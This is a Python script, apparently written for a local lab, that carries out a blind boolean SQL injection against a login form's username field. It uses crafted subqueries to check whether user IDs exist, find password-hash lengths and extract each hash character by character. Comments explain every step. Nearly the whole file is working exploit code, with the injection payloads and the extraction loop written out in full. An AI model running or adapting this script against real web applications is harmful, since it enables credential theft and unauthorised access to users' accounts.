import requests

total_queries = 0
charset = "0123456789abcdef"
"""charset for the injection is defined as 0-9 & a-f 
because data format we'll be extracting are hash sums stored in hex"""
target = "http://127.0.0.1:8000/users/login/"
needle = "Hello"

def injected_query(payload):
    """Need to send a query to the app, so we'll create a function that 
    takes a payload as param"""
    global total_queries
    r = requests.post(target, data={"username": "admin' and {}--".format(payload), "password": "password"})
    total_queries += 1
    return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"):
    """It's a BLIND SQL injection
    meaning we need to check whether our needle is in the response and use 
    that as inference to understand whether our request succeeded or failed 
    which we can convert to a True or False response"""
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

"""Using two different payloads using the same SQL injection function to interface with the
web app and understand whether or not the SQL inject failed or succeeded."""

def invalid_user(user_id):
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

def password_length(user_id):
    """since its a BLIND injection we can't just ask the app to tell us the exact value
  instead we have to start with zero and then increment the length of our guess
  and then we can use the SQL injection to ask a query to the app"""
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            """if the app tells us its greater than a certain value then we increment and try again
    until the app tells the request is False and then we know that the length can't be 
    any bigger so we've found the password hash length."""
            return i
        i += 1

def extract_hash(charset, user_id, password_length):
    """ can iterate over every potential character and determine whether that specific character 
    is valid for that certain index in the user's password and if the character is valid we
    know the right character at that index and we can increment the index and start again"""
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

def total_queries_taken():
    global total_queries
    print(f"\t\t[!] {total_queries} total queries!")
    total_queries = 0


"""Now that functions have been created need a way to interact with them, so we will
create an infinite while loop
- ask user to enter user ID to get pass hash
- check if user is valid
- get password hash length
- print number of queries taken
- otherwise print user doesnt exist
- Because in infinite while loop need clean way to exit so
    we use try/except block and expect is KeyboardInterrupt to break
- print out the extracted hash"""

while True:
    try:
        user_id = input("> Enter user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print(f"\t[-] User {user_id} hash length: {user_password_length}")
            total_queries_taken()
            print(f"\t[-] User {user_id} hash: {extract_hash(charset, int(user_id), user_password_length)}")
            total_queries_taken()
        else:
            print(f"\t[X] User {user_id} does not exist!")
    except KeyboardInterrupt:
        break